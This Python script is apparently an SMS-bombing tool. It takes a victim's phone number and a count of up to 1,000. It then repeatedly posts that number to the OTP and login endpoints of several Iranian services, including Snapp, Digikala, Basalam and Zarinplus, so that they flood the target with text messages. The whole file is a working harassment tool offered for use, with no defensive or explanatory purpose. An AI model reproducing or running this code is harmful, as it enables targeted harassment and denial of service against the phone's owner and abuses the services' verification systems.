import requests
import json
import time

from libs.utils import console

try:

    while True:
        console.clear()
        console.welcome()
        console.menu()
        userSelectItem = input(console.status("+")+"Choose an option (1/2/3/..) : ")
        
        if userSelectItem == "1":
            targetNumber = input(console.status("+","Enter phone number (914xxxxxxx) : "))

            if targetNumber == "": 
                print(console.status("-","The number cannot be empty "))
                input(console.status("+")+"Press enter to refresh the page ")
            else : 
                smsRepetition = input(console.status("+","Number of messages (max = 1,000) : "))

                if smsRepetition == "":
                    print(console.status("*","The empty value is equal to 20 messages"))
                    smsRepetition = 20
                elif int(smsRepetition) > 1000:
                    print(console.status("*","The maximum capacity is 1,000 messages"))
                    smsRepetition = 1000
                else:
                    smsRepetition = int(smsRepetition)
        
                print("\n"+console.status("#")+"Starting to send SMS bombs ...")

                messageIndex = 0
                apiServices = {
                    "snapp taxi":{"url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp","data": {"cellphone":"+98"+targetNumber}},
                    "snapp market":{"url": "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone="+targetNumber,"data": {}},
                    "snapp link":{"url": "https://api.snapp.ir/api/v1/sms/link","data": {"phone":"09"+targetNumber}},
                    "basalam":{"url": "https://auth.basalam.com/otp-request","data": {"mobile":"0"+targetNumber,"client_id":11}},
                    "digikala":{"url": "https://api.digikala.com/v1/user/authenticate/","data": {"backUrl":"/","username":"0"+targetNumber,"otp_call":False}},
                    "zarinplus":{"url": "https://api.zarinplus.com/user/zarinpal-login","data": {"phone_number":"98"+targetNumber,"source":"zarinplus"}},
                }

                while (smsRepetition > messageIndex):
                        for apiIndex, apiService in apiServices.items():
                            if (messageIndex >= smsRepetition): break
                            apiName = apiIndex
                            apiUrl = apiService["url"]
                            apiData = apiService["data"]
                            sendMessage = requests.post(apiUrl,data=apiData)
                            print(console.status("#")+"Send SMS +1 ("+str(messageIndex+1)+"/"+str(smsRepetition)+") ("+apiName+") "+console.header+sendMessage.reason+console.endc)
                            if (sendMessage.reason == "OK"): messageIndex+=1
                            time.sleep(2)
                else :
                    console.love()
                    print("\n"+console.status("#")+"Messages sent successfully (:")
                    input(console.status("@","Press enter to refresh the page "))

        elif userSelectItem == "2":
            print(console.status("*","The desired service is not active"))
            input(console.status("+","Press enter to refresh the page "))
        
        elif userSelectItem == "3":
            print(console.status("*","The desired service is not active"))
            input(console.status("+","Press enter to refresh the page "))
        
        else :
            print(console.status("-","The desired option does not exist"))
            input(console.status("+","Press enter to refresh the page "))

except:
    print("\n"+console.status("-","You Exit Tools !!"))

